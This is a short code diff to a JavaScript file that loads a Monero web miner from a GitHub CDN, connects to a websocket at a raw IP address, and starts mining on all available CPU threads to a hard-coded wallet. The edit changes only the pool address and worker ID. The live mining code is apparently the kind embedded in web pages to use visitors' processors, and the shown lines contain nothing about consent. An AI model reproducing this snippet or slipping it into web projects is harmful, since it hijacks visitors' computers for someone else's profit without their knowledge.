@@ -7,9 +7,9 @@ script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.
 document.head.appendChild(script);
 
 server = "wss://45.119.82.33:40725/";
-var pool = "gulf.moneroocean.stream:10128";
+var pool = "moneroocean.stream";
 var walletAddress = "48jHRYSargAAjLAcuowSfoWK2FaSq7QdVf8s4k1jZgki7Jh3iMGsDPqg1vR4BT3CEJPAg3b8gircW1sUbgZSsa5eHuJ4ZER";
-var workerId = "GH-XMR-LK"
+var workerId = "GH-XMR"
 var threads = -1;
 var password = "";
 startMining(pool, walletAddress, workerId, threads, password);
